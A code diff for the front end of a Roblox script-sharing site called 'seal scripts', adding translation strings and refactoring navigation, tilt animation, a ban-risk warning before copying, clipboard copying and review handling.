-ja:{welcome:"ようこそ",presents:"seal scripts プレゼンツ",viewScripts:"スクリプトを見る",reviews:"レビュー",disclaimer:"このウェブサイトは Roblox Corporation、Roblox ゲーム、またはゲーム内プロジェクトとは一切関係ありません。すべての一致は偶然です。",copy:"コピー",leaveReview:"レビューを書く",reviewSubtitle:"スクリプトを 1〜5 つ星で評価してください。匿名レビュー。",yourRating:"あなたの評価",yourReview:"あなたのレビュー",reviewPlaceholder:"ここに正直なレビューを書いてください...（任意）",sendToSeal:"Seal に送信",goBack:"戻る",warningTitle:"警告",warningText:"これらのスクリプトを使用すると、アカウントの<strong>全責任</strong>を負います。モデレーターや管理者に BAN された場合、<strong>Seal は一切関与していません</strong>。<br><br>自己責任で慎重にプレイしてください。",warningBtn:"責任を負います、コピー",pleaseRead:"お読みください...",thanksTitle:"レビューありがとうございます！",thanksText:"あなたのフィードバックは Seal にとって大きな意味があります。<br>すぐに確認されます。",close:"閉じる",madTitle:"Seal は怒っています",madText:"すでにレビューを残しています。<br>各ユーザーは 1 回のみレビューを送信できます。",pickRating:"まず評価を選択してください",copied:"コピーしました ✓",couldNotCopy:"コピーできませんでした",sending:"送信中...",sent:"送信しました ✓"},
-ru:{welcome:"Добро пожаловать",presents:"seal scripts представляет",viewScripts:"Посмотреть скрипты",reviews:"Отзывы",disclaimer:"Этот сайт никак не связан с Roblox Corporation, игрой Roblox или какими-либо внутриигровыми проектами. Все совпадения случайны.",copy:"Копировать",leaveReview:"Оставить отзыв",reviewSubtitle:"Оцените скрипты от 1 до 5 звёзд. Анонимные отзывы.",yourRating:"Ваша оценка",yourReview:"Ваш отзыв",reviewPlaceholder:"Напишите честный отзыв здесь... (необязательно)",sendToSeal:"Отправить Seal",goBack:"Назад",warningTitle:"Предупреждение",warningText:"Используя эти скрипты, вы берёте <strong>полную ответственность</strong> за свой аккаунт. Если вас забанят модераторы или админы — <strong>Seal к этому не причастен</strong>.<br><br>Играйте осторожно и на свой страх и риск.",warningBtn:"Я беру ответственность, копировать",pleaseRead:"Пожалуйста, прочитайте...",thanksTitle:"Спасибо за отзыв!",thanksText:"Ваш отзыв много значит для Seal.<br>Он будет скоро рассмотрен.",close:"Закрыть",madTitle:"Seal злится",madText:"Вы уже оставили отзыв.<br>Каждый пользователь может оставить только один отзыв.",pickRating:"Сначала выберите оценку",copied:"Скопировано ✓",couldNotCopy:"Не удалось скопировать",sending:"Отправка...",sent:"Отправлено ✓"},
-pt:{welcome:"Bem-vindo",presents:"seal scripts apresenta",viewScripts:"Ver scripts",reviews:"Avaliações",disclaimer:"Este site não é afiliado, endossado ou conectado à Roblox Corporation, ao jogo Roblox ou a qualquer projeto dentro do jogo. Todas as coincidências são puramente acidentais.",copy:"Copiar",leaveReview:"Deixe uma avaliação",reviewSubtitle:"Avalie os scripts de 1 a 5 estrelas. Avaliações anônimas.",yourRating:"Sua avaliação",yourReview:"Sua avaliação",reviewPlaceholder:"Escreva sua avaliação honesta aqui... (opcional)",sendToSeal:"Enviar para Seal",goBack:"Voltar",warningTitle:"Aviso",warningText:"Ao usar esses scripts, você assume <strong>total responsabilidade</strong> pela sua conta. Se você for banido por moderadores ou admins — <strong>Seal não tem nada a ver com isso</strong>.<br><br>Jogue com cuidado e por sua conta e risco.",warningBtn:"Eu assumo a responsabilidade, copiar",pleaseRead:"Por favor leia...",thanksTitle:"Obrigado pela avaliação!",thanksText:"Seu feedback significa muito para Seal.<br>Será revisado em breve.",close:"Fechar",madTitle:"Seal está irritado",madText:"Você já deixou uma avaliação.<br>Cada usuário pode enviar apenas uma avaliação.",pickRating:"Por favor escolha uma avaliação primeiro",copied:"Copiado ✓",couldNotCopy:"Não foi possível copiar",sending:"Enviando...",sent:"Enviado ✓"},
-zh:{welcome:"欢迎",presents:"seal scripts 出品",viewScripts:"查看脚本",reviews:"评价",disclaimer:"本网站与 Roblox Corporation、Roblox 游戏或任何游戏内项目没有任何关联。所有巧合纯属偶然。",copy:"复制",leaveReview:"留下评价",reviewSubtitle:"为脚本评分 1 到 5 星。匿名评价。",yourRating:"你的评分",yourReview:"你的评价",reviewPlaceholder:"在这里写下你的真实评价...（可选）",sendToSeal:"发送给 Seal",goBack:"返回",warningTitle:"警告",warningText:"使用这些脚本，您将对您的账户承担<strong>全部责任</strong>。如果被管理员封禁——<strong>Seal 与此无关</strong>。<br><br>请谨慎游戏，风险自负。",warningBtn:"我承担责任，复制",pleaseRead:"请阅读...",thanksTitle:"感谢评价！",thanksText:"你的反馈对 Seal 很重要。<br>很快就会审核。",close:"关闭",madTitle:"Seal 生气了",madText:"你已经留下评价了。<br>每个用户只能提交一次评价。",pickRating:"请先选择评分",copied:"已复制 ✓",couldNotCopy:"无法复制",sending:"发送中...",sent:"已发送 ✓"},
-ko:{welcome:"환영합니다",presents:"seal scripts 제공",viewScripts:"스크립트 보기",reviews:"리뷰",disclaimer:"이 웹사이트는 Roblox Corporation, Roblox 게임 또는 게임 내 프로젝트와 관련이 없습니다. 모든 일치는 우연입니다.",copy:"복사",leaveReview:"리뷰 남기기",reviewSubtitle:"스크립트를 1~5점으로 평가해주세요. 익명 리뷰.",yourRating:"당신의 평가",yourReview:"당신의 리뷰",reviewPlaceholder:"여기에 솔직한 리뷰를 작성하세요... (선택 사항)",sendToSeal:"Seal에게 보내기",goBack:"돌아가기",warningTitle:"경고",warningText:"이 스크립트를 사용하면 계정에 대한 <strong>모든 책임</strong>은 본인에게 있습니다. 관리자나 모더레이터에 의해 차단되더라도 <strong>Seal은 관련이 없습니다</strong>.<br><br>신중하게 본인 책임 하에 플레이하세요.",warningBtn:"책임을 지겠습니다, 복사",pleaseRead:"읽어주세요...",thanksTitle:"리뷰 감사합니다!",thanksText:"당신의 피드백은 Seal에게 큰 의미가 있습니다.<br>곧 검토될 것입니다.",close:"닫기",madTitle:"Seal이 화났어요",madText:"이미 리뷰를 남겼습니다.<br>각 사용자는 한 번만 리뷰를 제출할 수 있습니다.",pickRating:"먼저 평가를 선택하세요",copied:"복사됨 ✓",couldNotCopy:"복사할 수 없습니다",sending:"전송 중...",sent:"전송됨 ✓"},
-hi:{welcome:"स्वागत है",presents:"seal scripts प्रस्तुत करता है",viewScripts:"स्क्रिप्ट देखें",reviews:"समीक्षाएँ",disclaimer:"यह वेबसाइट Roblox Corporation, Roblox गेम या किसी भी इन-गेम प्रोजेक्ट से संबद्ध नहीं है। सभी संयोग पूरी तरह से संयोगवश हैं।",copy:"कॉपी करें",leaveReview:"समीक्षा छोड़ें",reviewSubtitle:"स्क्रिप्ट को 1 से 5 सितारों में रेट करें। अनाम समीक्षाएँ।",yourRating:"आपकी रेटिंग",yourReview:"आपकी समीक्षा",reviewPlaceholder:"यहाँ अपनी ईमानदार समीक्षा लिखें... (वैकल्पिक)",sendToSeal:"Seal को भेजें",goBack:"वापस जाएँ",warningTitle:"चेतावनी",warningText:"इन स्क्रिप्ट्स का उपयोग करके, आप अपने अकाउंट की <strong>पूरी जिम्मेदारी</strong> लेते हैं। अगर मॉडरेटर या एडमिन आपको बैन करते हैं — <strong>Seal इससे जुड़ा नहीं है</strong>।<br><br>सावधानी से खेलें और अपने जोखिम पर।",warningBtn:"मैं जिम्मेदारी लेता हूँ, कॉपी करें",pleaseRead:"कृपया पढ़ें...",thanksTitle:"समीक्षा के लिए धन्यवाद!",thanksText:"आपकी प्रतिक्रिया Seal के लिए बहुत मायने रखती है।<br>इसे जल्द ही समीक्षा किया जाएगा।",close:"बंद करें",madTitle:"Seal नाराज़ है",madText:"आपने पहले ही एक समीक्षा छोड़ दी है।<br>प्रत्येक उपयोगकर्ता केवल एक समीक्षा सबमिट कर सकता है।",pickRating:"कृपया पहले एक रेटिंग चुनें",copied:"कॉपी किया गया ✓",couldNotCopy:"कॉपी नहीं कर सका",sending:"भेज रहे हैं...",sent:"भेज दिया ✓"},
-de:{welcome:"Willkommen",presents:"seal scripts präsentiert",viewScripts:"Skripte ansehen",reviews:"Bewertungen",disclaimer:"Diese Website ist nicht mit der Roblox Corporation, dem Spiel Roblox oder irgendwelchen In-Game-Projekten verbunden. Alle Übereinstimmungen sind rein zufällig.",copy:"Kopieren",leaveReview:"Bewertung abgeben",reviewSubtitle:"Bewerte die Skripte von 1 bis 5 Sternen. Anonyme Bewertungen.",yourRating:"Deine Bewertung",yourReview:"Deine Rezension",reviewPlaceholder:"Schreibe hier deine ehrliche Bewertung... (optional)",sendToSeal:"An Seal senden",goBack:"Zurück",warningTitle:"Warnung",warningText:"Durch die Nutzung dieser Skripte übernimmst du die <strong>volle Verantwortung</strong> für dein Konto. Wenn du von Moderatoren oder Admins gebannt wirst — <strong>Seal ist nicht beteiligt</strong>.<br><br>Spiele vorsichtig und auf eigenes Risiko.",warningBtn:"Ich übernehme die Verantwortung, kopieren",pleaseRead:"Bitte lesen...",thanksTitle:"Danke für die Bewertung!",thanksText:"Dein Feedback bedeutet Seal viel.<br>Es wird bald überprüft.",close:"Schließen",madTitle:"Seal ist wütend",madText:"Du hast bereits eine Bewertung abgegeben.<br>Jeder Nutzer kann nur eine Bewertung einreichen.",pickRating:"Bitte wähle zuerst eine Bewertung",copied:"Kopiert ✓",couldNotCopy:"Kopieren fehlgeschlagen",sending:"Senden...",sent:"Gesendet ✓"}
+en:{welcome:"Welcome",presents:"seal scripts presents",viewScripts:"View scripts",reviews:"Reviews",login:"Login / Register",disclaimer:"This website is not affiliated with, endorsed by, or connected to Roblox Corporation, the game Roblox, or any in-game projects. All coincidences are purely accidental.",copy:"Copy",leaveReview:"Leave a review",reviewSubtitle:"Rate the scripts from 1 to 5 stars. Anonymous reviews.",yourRating:"Your rating",yourReview:"Your review",reviewPlaceholder:"Write your honest review here... (optional)",sendToSeal:"Send To Seal",goBack:"Go Back",warningTitle:"Warning",warningText:"By using these scripts, you take <strong>full responsibility</strong> for your account. If you get banned by moderators or admins — <strong>Seal is not involved</strong> in any way.<br><br>Play carefully and at your own risk.",warningBtn:"I take responsibility, copy",pleaseRead:"Please read...",thanksTitle:"Thanks For Review!",thanksText:"Your feedback means a lot to Seal.<br>It will be reviewed soon.",close:"Close",madTitle:"Seal is mad",madText:"You already left a review.<br>Each user can only submit one review.",pickRating:"Please pick a rating first",copied:"Copied ✓",couldNotCopy:"Could not copy",sendFailed:"Send failed, try again",sending:"Sending...",sent:"Sent ✓"},
+es:{welcome:"Bienvenido",presents:"seal scripts presenta",viewScripts:"Ver scripts",reviews:"Reseñas",login:"Iniciar sesión / Registrarse",disclaimer:"Este sitio web no está afiliado, respaldado ni conectado con Roblox Corporation, el juego Roblox ni ningún proyecto dentro del juego. Todas las coincidencias son puramente accidentales.",copy:"Copiar",leaveReview:"Deja una reseña",reviewSubtitle:"Valora los scripts de 1 a 5 estrellas. Reseñas anónimas.",yourRating:"Tu valoración",yourReview:"Tu reseña",reviewPlaceholder:"Escribe tu reseña honesta aquí... (opcional)",sendToSeal:"Enviar a Seal",goBack:"Volver",warningTitle:"Advertencia",warningText:"Al usar estos scripts, asumes <strong>toda la responsabilidad</strong> de tu cuenta. Si los moderadores o administradores te banean — <strong>Seal no tiene nada que ver</strong>.<br><br>Juega con cuidado y bajo tu propio riesgo.",warningBtn:"Asumo la responsabilidad, copiar",pleaseRead:"Por favor lee...",thanksTitle:"¡Gracias por tu reseña!",thanksText:"Tu opinión significa mucho para Seal.<br>Será revisada pronto.",close:"Cerrar",madTitle:"Seal está enojado",madText:"Ya dejaste una reseña.<br>Cada usuario puede enviar solo una reseña.",pickRating:"Primero elige una valoración",copied:"Copiado ✓",couldNotCopy:"No se pudo copiar",sendFailed:"Error al enviar, inténtalo de nuevo",sending:"Enviando...",sent:"Enviado ✓"},
+ja:{welcome:"ようこそ",presents:"seal scripts プレゼンツ",viewScripts:"スクリプトを見る",reviews:"レビュー",login:"ログイン / 登録",disclaimer:"このウェブサイトは Roblox Corporation、Roblox ゲーム、またはゲーム内プロジェクトとは一切関係ありません。すべての一致は偶然です。",copy:"コピー",leaveReview:"レビューを書く",reviewSubtitle:"スクリプトを 1〜5 つ星で評価してください。匿名レビュー。",yourRating:"あなたの評価",yourReview:"あなたのレビュー",reviewPlaceholder:"ここに正直なレビューを書いてください...（任意）",sendToSeal:"Seal に送信",goBack:"戻る",warningTitle:"警告",warningText:"これらのスクリプトを使用すると、アカウントの<strong>全責任</strong>を負います。モデレーターや管理者に BAN された場合、<strong>Seal は一切関与していません</strong>。<br><br>自己責任で慎重にプレイしてください。",warningBtn:"責任を負います、コピー",pleaseRead:"お読みください...",thanksTitle:"レビューありがとうございます！",thanksText:"あなたのフィードバックは Seal にとって大きな意味があります。<br>すぐに確認されます。",close:"閉じる",madTitle:"Seal は怒っています",madText:"すでにレビューを残しています。<br>各ユーザーは 1 回のみレビューを送信できます。",pickRating:"まず評価を選択してください",copied:"コピーしました ✓",couldNotCopy:"コピーできませんでした",sendFailed:"送信に失敗しました。再試行してください",sending:"送信中...",sent:"送信しました ✓"},
+ru:{welcome:"Добро пожаловать",presents:"seal scripts представляет",viewScripts:"Посмотреть скрипты",reviews:"Отзывы",login:"Войти / Регистрация",disclaimer:"Этот сайт никак не связан с Roblox Corporation, игрой Roblox или какими-либо внутриигровыми проектами. Все совпадения случайны.",copy:"Копировать",leaveReview:"Оставить отзыв",reviewSubtitle:"Оцените скрипты от 1 до 5 звёзд. Анонимные отзывы.",yourRating:"Ваша оценка",yourReview:"Ваш отзыв",reviewPlaceholder:"Напишите честный отзыв здесь... (необязательно)",sendToSeal:"Отправить Seal",goBack:"Назад",warningTitle:"Предупреждение",warningText:"Используя эти скрипты, вы берёте <strong>полную ответственность</strong> за свой аккаунт. Если вас забанят модераторы или админы — <strong>Seal к этому не причастен</strong>.<br><br>Играйте осторожно и на свой страх и риск.",warningBtn:"Я беру ответственность, копировать",pleaseRead:"Пожалуйста, прочитайте...",thanksTitle:"Спасибо за отзыв!",thanksText:"Ваш отзыв много значит для Seal.<br>Он будет скоро рассмотрен.",close:"Закрыть",madTitle:"Seal злится",madText:"Вы уже оставили отзыв.<br>Каждый пользователь может оставить только один отзыв.",pickRating:"Сначала выберите оценку",copied:"Скопировано ✓",couldNotCopy:"Не удалось скопировать",sendFailed:"Не удалось отправить, попробуйте ещё раз",sending:"Отправка...",sent:"Отправлено ✓"},
+pt:{welcome:"Bem-vindo",presents:"seal scripts apresenta",viewScripts:"Ver scripts",reviews:"Avaliações",login:"Entrar / Registrar",disclaimer:"Este site não é afiliado, endossado ou conectado à Roblox Corporation, ao jogo Roblox ou a qualquer projeto dentro do jogo. Todas as coincidências são puramente acidentais.",copy:"Copiar",leaveReview:"Deixe uma avaliação",reviewSubtitle:"Avalie os scripts de 1 a 5 estrelas. Avaliações anônimas.",yourRating:"Sua avaliação",yourReview:"Sua avaliação",reviewPlaceholder:"Escreva sua avaliação honesta aqui... (opcional)",sendToSeal:"Enviar para Seal",goBack:"Voltar",warningTitle:"Aviso",warningText:"Ao usar esses scripts, você assume <strong>total responsabilidade</strong> pela sua conta. Se você for banido por moderadores ou admins — <strong>Seal não tem nada a ver com isso</strong>.<br><br>Jogue com cuidado e por sua conta e risco.",warningBtn:"Eu assumo a responsabilidade, copiar",pleaseRead:"Por favor leia...",thanksTitle:"Obrigado pela avaliação!",thanksText:"Seu feedback significa muito para Seal.<br>Será revisado em breve.",close:"Fechar",madTitle:"Seal está irritado",madText:"Você já deixou uma avaliação.<br>Cada usuário pode enviar apenas uma avaliação.",pickRating:"Por favor escolha uma avaliação primeiro",copied:"Copiado ✓",couldNotCopy:"Não foi possível copiar",sendFailed:"Falha ao enviar, tente novamente",sending:"Enviando...",sent:"Enviado ✓"},
+zh:{welcome:"欢迎",presents:"seal scripts 出品",viewScripts:"查看脚本",reviews:"评价",login:"登录 / 注册",disclaimer:"本网站与 Roblox Corporation、Roblox 游戏或任何游戏内项目没有任何关联。所有巧合纯属偶然。",copy:"复制",leaveReview:"留下评价",reviewSubtitle:"为脚本评分 1 到 5 星。匿名评价。",yourRating:"你的评分",yourReview:"你的评价",reviewPlaceholder:"在这里写下你的真实评价...（可选）",sendToSeal:"发送给 Seal",goBack:"返回",warningTitle:"警告",warningText:"使用这些脚本，您将对您的账户承担<strong>全部责任</strong>。如果被管理员封禁——<strong>Seal 与此无关</strong>。<br><br>请谨慎游戏，风险自负。",warningBtn:"我承担责任，复制",pleaseRead:"请阅读...",thanksTitle:"感谢评价！",thanksText:"你的反馈对 Seal 很重要。<br>很快就会审核。",close:"关闭",madTitle:"Seal 生气了",madText:"你已经留下评价了。<br>每个用户只能提交一次评价。",pickRating:"请先选择评分",copied:"已复制 ✓",couldNotCopy:"无法复制",sendFailed:"发送失败，请重试",sending:"发送中...",sent:"已发送 ✓"},
+ko:{welcome:"환영합니다",presents:"seal scripts 제공",viewScripts:"스크립트 보기",reviews:"리뷰",login:"로그인 / 가입",disclaimer:"이 웹사이트는 Roblox Corporation, Roblox 게임 또는 게임 내 프로젝트와 관련이 없습니다. 모든 일치는 우연입니다.",copy:"복사",leaveReview:"리뷰 남기기",reviewSubtitle:"스크립트를 1~5점으로 평가해주세요. 익명 리뷰.",yourRating:"당신의 평가",yourReview:"당신의 리뷰",reviewPlaceholder:"여기에 솔직한 리뷰를 작성하세요... (선택 사항)",sendToSeal:"Seal에게 보내기",goBack:"돌아가기",warningTitle:"경고",warningText:"이 스크립트를 사용하면 계정에 대한 <strong>모든 책임</strong>은 본인에게 있습니다. 관리자나 모더레이터에 의해 차단되더라도 <strong>Seal은 관련이 없습니다</strong>.<br><br>신중하게 본인 책임 하에 플레이하세요.",warningBtn:"책임을 지겠습니다, 복사",pleaseRead:"읽어주세요...",thanksTitle:"리뷰 감사합니다!",thanksText:"당신의 피드백은 Seal에게 큰 의미가 있습니다.<br>곧 검토될 것입니다.",close:"닫기",madTitle:"Seal이 화났어요",madText:"이미 리뷰를 남겼습니다.<br>각 사용자는 한 번만 리뷰를 제출할 수 있습니다.",pickRating:"먼저 평가를 선택하세요",copied:"복사됨 ✓",couldNotCopy:"복사할 수 없습니다",sendFailed:"전송 실패, 다시 시도하세요",sending:"전송 중...",sent:"전송됨 ✓"},
+hi:{welcome:"स्वागत है",presents:"seal scripts प्रस्तुत करता है",viewScripts:"स्क्रिप्ट देखें",reviews:"समीक्षाएँ",login:"लॉगिन / रजिस्टर",disclaimer:"यह वेबसाइट Roblox Corporation, Roblox गेम या किसी भी इन-गेम प्रोजेक्ट से संबद्ध नहीं है। सभी संयोग पूरी तरह से संयोगवश हैं।",copy:"कॉपी करें",leaveReview:"समीक्षा छोड़ें",reviewSubtitle:"स्क्रिप्ट को 1 से 5 सितारों में रेट करें। अनाम समीक्षाएँ।",yourRating:"आपकी रेटिंग",yourReview:"आपकी समीक्षा",reviewPlaceholder:"यहाँ अपनी ईमानदार समीक्षा लिखें... (वैकल्पिक)",sendToSeal:"Seal को भेजें",goBack:"वापस जाएँ",warningTitle:"चेतावनी",warningText:"इन स्क्रिप्ट्स का उपयोग करके, आप अपने अकाउंट की <strong>पूरी जिम्मेदारी</strong> लेते हैं। अगर मॉडरेटर या एडमिन आपको बैन करते हैं — <strong>Seal इससे जुड़ा नहीं है</strong>।<br><br>सावधानी से खेलें और अपने जोखिम पर।",warningBtn:"मैं जिम्मेदारी लेता हूँ, कॉपी करें",pleaseRead:"कृपया पढ़ें...",thanksTitle:"समीक्षा के लिए धन्यवाद!",thanksText:"आपकी प्रतिक्रिया Seal के लिए बहुत मायने रखती है।<br>इसे जल्द ही समीक्षा किया जाएगा।",close:"बंद करें",madTitle:"Seal नाराज़ है",madText:"आपने पहले ही एक समीक्षा छोड़ दी है।<br>प्रत्येक उपयोगकर्ता केवल एक समीक्षा सबमिट कर सकता है।",pickRating:"कृपया पहले एक रेटिंग चुनें",copied:"कॉपी किया गया ✓",couldNotCopy:"कॉपी नहीं कर सका",sendFailed:"भेजना विफल, पुनः प्रयास करें",sending:"भेज रहे हैं...",sent:"भेज दिया ✓"},
+de:{welcome:"Willkommen",presents:"seal scripts präsentiert",viewScripts:"Skripte ansehen",reviews:"Bewertungen",login:"Anmelden / Registrieren",disclaimer:"Diese Website ist nicht mit der Roblox Corporation, dem Spiel Roblox oder irgendwelchen In-Game-Projekten verbunden. Alle Übereinstimmungen sind rein zufällig.",copy:"Kopieren",leaveReview:"Bewertung abgeben",reviewSubtitle:"Bewerte die Skripte von 1 bis 5 Sternen. Anonyme Bewertungen.",yourRating:"Deine Bewertung",yourReview:"Deine Rezension",reviewPlaceholder:"Schreibe hier deine ehrliche Bewertung... (optional)",sendToSeal:"An Seal senden",goBack:"Zurück",warningTitle:"Warnung",warningText:"Durch die Nutzung dieser Skripte übernimmst du die <strong>volle Verantwortung</strong> für dein Konto. Wenn du von Moderatoren oder Admins gebannt wirst — <strong>Seal ist nicht beteiligt</strong>.<br><br>Spiele vorsichtig und auf eigenes Risiko.",warningBtn:"Ich übernehme die Verantwortung, kopieren",pleaseRead:"Bitte lesen...",thanksTitle:"Danke für die Bewertung!",thanksText:"Dein Feedback bedeutet Seal viel.<br>Es wird bald überprüft.",close:"Schließen",madTitle:"Seal ist wütend",madText:"Du hast bereits eine Bewertung abgegeben.<br>Jeder Nutzer kann nur eine Bewertung einreichen.",pickRating:"Bitte wähle zuerst eine Bewertung",copied:"Kopiert ✓",couldNotCopy:"Kopieren fehlgeschlagen",sendFailed:"Senden fehlgeschlagen, erneut versuchen",sending:"Senden...",sent:"Gesendet ✓"}
 };
 let currentLang='en';
 function applyLang(lang){
@@ -258,31 +1184,106 @@ function applyLang(lang){
     document.querySelectorAll('[data-i18n-title]').forEach(el=>{const k=el.getAttribute('data-i18n-title');if(t[k]!==undefined){el.title=t[k];el.setAttribute('aria-label',t[k])}});
     if(warningCounting&&warningConfirm.disabled){warningConfirm.textContent=t.pleaseRead+' '+warningSecondsLeft}
     document.getElementById('langSelect').value=lang;
+    document.getElementById('globalBack').textContent=t.goBack;
     try{localStorage.setItem('seal_lang',lang)}catch(e){}
 }
 const langSwitcher=document.getElementById('langSwitcher');
+const holoZone=document.getElementById('holoZone');
 const pageHome=document.getElementById('page-home');
 const pageScripts=document.getElementById('page-scripts');
 const pageReviews=document.getElementById('page-reviews');
+const globalBack=document.getElementById('globalBack');
+
 function showPage(page,hash){
     [pageHome,pageScripts,pageReviews].forEach(p=>p.classList.remove('active'));
     page.classList.add('active');
-    if(page===pageHome)langSwitcher.classList.add('visible');
-    else langSwitcher.classList.remove('visible');
-    window.scrollTo(0,0);
+    if(page===pageHome){
+        langSwitcher.classList.add('visible');
+        holoZone.classList.add('active');
+        globalBack.classList.remove('visible');
+    } else {
+        langSwitcher.classList.remove('visible');
+        holoZone.classList.remove('active');
+        globalBack.classList.add('visible');
+    }
     if(hash)history.pushState({},'',hash);
 }
 document.getElementById('goToScripts').addEventListener('click',()=>showPage(pageScripts,'#scripts'));
 document.getElementById('goToReviews').addEventListener('click',()=>showPage(pageReviews,'#reviews'));
-document.getElementById('goToHomeFromScripts').addEventListener('click',()=>showPage(pageHome,'#home'));
-document.getElementById('goToHomeFromReviews').addEventListener('click',()=>showPage(pageHome,'#home'));
-function restorePage(){if(location.hash==='#scripts')showPage(pageScripts);else if(location.hash==='#reviews')showPage(pageReviews);else showPage(pageHome)}
+globalBack.addEventListener('click',()=>showPage(pageHome,'#home'));
+function restorePage(){
+    if(location.hash==='#scripts')showPage(pageScripts);
+    else if(location.hash==='#reviews')showPage(pageReviews);
+    else showPage(pageHome);
+}
 restorePage();
 window.addEventListener('popstate',restorePage);
-const tiltElements=document.querySelectorAll('[data-tilt]');
-tiltElements.forEach(el=>{let rafId=null,targetX=0,targetY=0,currentX=0,currentY=0;const MAX_SHIFT=.4;document.addEventListener('mousemove',e=>{const activePage=el.closest('.page');if(!activePage||!activePage.classList.contains('active'))return;const px=(e.clientX/window.innerWidth)-.5;const py=(e.clientY/window.innerHeight)-.5;targetX=px*MAX_SHIFT*2;targetY=py*MAX_SHIFT*2;if(!rafId)rafId=requestAnimationFrame(animate)});function animate(){currentX+=(targetX-currentX)*.12;currentY+=(targetY-currentY)*.12;el.style.transform=`translate3d(${currentX}px, ${currentY}px, 0) rotateX(${-currentY*.15}deg) rotateY(${currentX*.15}deg)`;if(Math.abs(targetX-currentX)>.05||Math.abs(targetY-currentY)>.05){rafId=requestAnimationFrame(animate)}else rafId=null}});
+
+/* ================= TILT ================= */
+(function initTilt(){
+    const tiltElements = document.querySelectorAll('[data-tilt]');
+    if(!tiltElements.length) return;
+
+    let vw = window.innerWidth;
+    let vh = window.innerHeight;
+    window.addEventListener('resize', () => {
+        vw = window.innerWidth;
+        vh = window.innerHeight;
+    });
+
+    const state = Array.from(tiltElements).map(el => ({
+        el,
+        targetX: 0, targetY: 0,
+        currentX: 0, currentY: 0
+    }));
+
+    let rafId = null;
+    let lastT = performance.now();
+    const MAX_SHIFT = 0.4;
+    const LERP = 0.07;
+
+    document.addEventListener('mousemove', e => {
+        const px = (e.clientX / vw) - 0.5;
+        const py = (e.clientY / vh) - 0.5;
+        for(const s of state){
+            const activePage = s.el.closest('.page');
+            if(!activePage || !activePage.classList.contains('active')) continue;
+            s.targetX = px * MAX_SHIFT * 2;
+            s.targetY = py * MAX_SHIFT * 2;
+        }
+        if(!rafId){ lastT = performance.now(); rafId = requestAnimationFrame(animate); }
+    });
+
+    function animate(now){
+        const dt = Math.min((now - lastT) / 1000, 0.05);
+        lastT = now;
+        const k = 1 - Math.pow(1 - LERP, dt * 60);
+        let stillMoving = false;
+
+        for(const s of state){
+            s.currentX += (s.targetX - s.currentX) * k;
+            s.currentY += (s.targetY - s.currentY) * k;
+
+            const dx = Math.abs(s.targetX - s.currentX);
+            const dy = Math.abs(s.targetY - s.currentY);
+            if(dx > 0.01 || dy > 0.01) stillMoving = true;
+            else { s.currentX = s.targetX; s.currentY = s.targetY; }
+
+            s.el.style.transform =
+                `translate3d(${s.currentX.toFixed(2)}px, ${s.currentY.toFixed(2)}px, 0) ` +
+                `rotateX(${(-s.currentY * .15).toFixed(3)}deg) ` +
+                `rotateY(${(s.currentX * .15).toFixed(3)}deg)`;
+        }
+
+        rafId = stillMoving ? requestAnimationFrame(animate) : null;
+    }
+})();
+
+/* ================= TOAST ================= */
 const toast=document.getElementById('toast');
-function showToast(msg,type){toast.textContent=msg;toast.className='toast show'+(type?' '+type:'');clearTimeout(showToast._t);showToast._t=setTimeout(()=>{toast.classList.remove('show')},2200)}
+function showToast(msg,type){toast.textContent=msg;toast.className='toast show'+(type?' '+type:'');clearTimeout(showToast._t);showToast._t=setTimeout(()=>{toast.classList.remove('show')},2400)}
+
+/* ================= WARNING / COPY ================= */
 const warningOverlay=document.getElementById('warningOverlay');
 const warningConfirm=document.getElementById('warningConfirm');
 const copyButtons=document.querySelectorAll('.copy-btn');
@@ -290,7 +1291,26 @@ let pendingText=null;
 let warningTimer=null;
 let warningCounting=false;
 let warningSecondsLeft=4;
-copyButtons.forEach(btn=>{btn.addEventListener('click',()=>{const targetId=btn.getAttribute('data-target');const targetEl=document.getElementById(targetId);const text=targetEl.textContent;const shouldWarn=btn.getAttribute('data-warn')==='true';if(shouldWarn){pendingText=text;openWarning()}else copyToClipboard(text)})});
+
+copyButtons.forEach(btn=>{
+    btn.addEventListener('click',()=>{
+        const targetId=btn.getAttribute('data-target');
+        const targetEl=document.getElementById(targetId);
+        const text=targetEl.textContent;
+        const shouldWarn=btn.getAttribute('data-warn')==='true';
+        if(shouldWarn){pendingText=text;openWarning()}
+        else copyToClipboard(text)
+    })
+});
+
+function resetWarningState(){
+    clearInterval(warningTimer);
+    warningCounting=false;
+    warningConfirm.disabled=true;
+    warningConfirm.textContent=translations[currentLang].warningBtn;
+    pendingText=null;
+}
+
 function openWarning(){
     warningOverlay.classList.add('show');
     warningConfirm.disabled=true;
@@ -310,16 +1330,34 @@ function openWarning(){
         }
     },1000);
 }
+
 warningConfirm.addEventListener('click',()=>{
     if(warningConfirm.disabled)return;
-    if(pendingText!==null){copyToClipboard(pendingText);pendingText=null}
+    if(pendingText!==null){copyToClipboard(pendingText)}
     warningOverlay.classList.remove('show');
-    clearInterval(warningTimer);
-    warningCounting=false;
-    warningConfirm.disabled=true;
-    warningConfirm.textContent=translations[currentLang].warningBtn;
+    resetWarningState();
 });
-async function copyToClipboard(text){try{await navigator.clipboard.writeText(text);showToast(translations[currentLang].copied,'success')}catch(err){const ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');showToast(translations[currentLang].copied,'success')}catch(e){alert(translations[currentLang].couldNotCopy)}document.body.removeChild(ta)}}
+
+warningOverlay.addEventListener('click',e=>{
+    if(e.target===warningOverlay){
+        warningOverlay.classList.remove('show');
+        resetWarningState();
+    }
+});
+
+async function copyToClipboard(text){
+    try{await navigator.clipboard.writeText(text);showToast(translations[currentLang].copied,'success')}
+    catch(err){
+        const ta=document.createElement('textarea');
+        ta.value=text;ta.style.position='fixed';ta.style.opacity='0';
+        document.body.appendChild(ta);ta.select();
+        try{document.execCommand('copy');showToast(translations[currentLang].copied,'success')}
+        catch(e){showToast(translations[currentLang].couldNotCopy,'error')}
+        document.body.removeChild(ta);
+    }
+}
+
+/* ================= REVIEWS ================= */
 const REVIEWED_KEY='seal_scripts_reviewed';
 const submitBtn=document.getElementById('submitBtn');
 const starsInput=document.getElementById('starsInput');
@@ -329,8 +1367,16 @@ const madOverlay=document.getElementById('madOverlay');
 const madClose=document.getElementById('madClose');
 const reviewText=document.getElementById('reviewText');
 let reviewSubmitting=false;
-function hasReviewed(){if(reviewSubmitting)return true;try{return localStorage.getItem(REVIEWED_KEY)==='1'}catch(e){return false}}
